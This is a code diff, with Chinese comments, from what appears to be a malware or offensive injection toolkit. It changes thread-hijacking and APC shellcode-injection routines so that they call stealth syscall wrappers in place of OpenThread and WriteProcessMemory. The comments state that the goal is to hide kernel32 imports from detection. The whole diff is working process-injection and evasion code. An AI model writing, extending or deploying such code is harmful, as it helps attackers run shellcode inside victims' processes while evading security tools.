@@ -333,8 +333,10 @@ ManualMapper::MapResult ManualMapper::ReflectiveLoad(
 
 bool ThreadHijacker::HijackThread(HANDLE hProcess, DWORD threadId,
                                    const void* shellcode, SIZE_T shellcodeSize) {
-    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
-                                 THREAD_SUSPEND_RESUME, FALSE, threadId);
+    // ★ BUILD 556: STEALTH_OPEN_THREAD 替代 OpenThread (消除 kernel32 IAT 导入)
+    HANDLE hThread = nullptr;
+    STEALTH_OPEN_THREAD(hThread, THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
+                                 THREAD_SUSPEND_RESUME, threadId);
     if (!hThread) return false;
 
     // 挂起线程
@@ -379,8 +381,10 @@ bool ThreadHijacker::HijackThread(HANDLE hProcess, DWORD threadId,
 
     // 写入远程进程
     SIZE_T written;
-    if (!WriteProcessMemory(hProcess, remoteCode, fullCode,
-                            fullSize, &written) || written != fullSize) {
+    // ★ BUILD 556: SysWriteVirtualMemory 替代 WriteProcessMemory (消除 kernel32 IAT 导入)
+    NTSTATUS writeStatus = stealth::SysWriteVirtualMemory(hProcess, remoteCode, fullCode,
+                                                          fullSize, &written);
+    if (!NT_SUCCESS(writeStatus) || written != fullSize) {
         // 写入失败, 恢复线程并清理
         VirtualFree(fullCode, 0, MEM_RELEASE);
         ResumeThread(hThread);
@@ -622,7 +626,9 @@ bool APCInjector::InjectToAllThreads(HANDLE hProcess,
     bool anySuccess = false;
     for (int i = 0; i < threadCount; i++) {
         DWORD tid = threadBuf[i];
-        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
+        // ★ BUILD 556: STEALTH_OPEN_THREAD 替代 OpenThread (消除 kernel32 IAT 导入)
+        HANDLE hThread = nullptr;
+        STEALTH_OPEN_THREAD(hThread, THREAD_SET_CONTEXT, tid);
         if (hThread) {
             InjectToThread(hThread, shellcode, shellcodeSize);
             CloseHandle(hThread);
@@ -708,7 +714,8 @@ bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
     if (!codeAddr) return false;
 
     SIZE_T written;
-    WriteProcessMemory(hTargetProcess, codeAddr, shellcode, shellcodeSize, &written);
+    // ★ BUILD 556: SysWriteVirtualMemory 替代 WriteProcessMemory (消除 kernel32 IAT 导入)
+    stealth::SysWriteVirtualMemory(hTargetProcess, codeAddr, shellcode, shellcodeSize, &written);
 
     // 如果打开了目标进程句柄, 关闭它 (APC 排队后不需要)
     if (hTargetProcess != GetCurrentProcess()) {
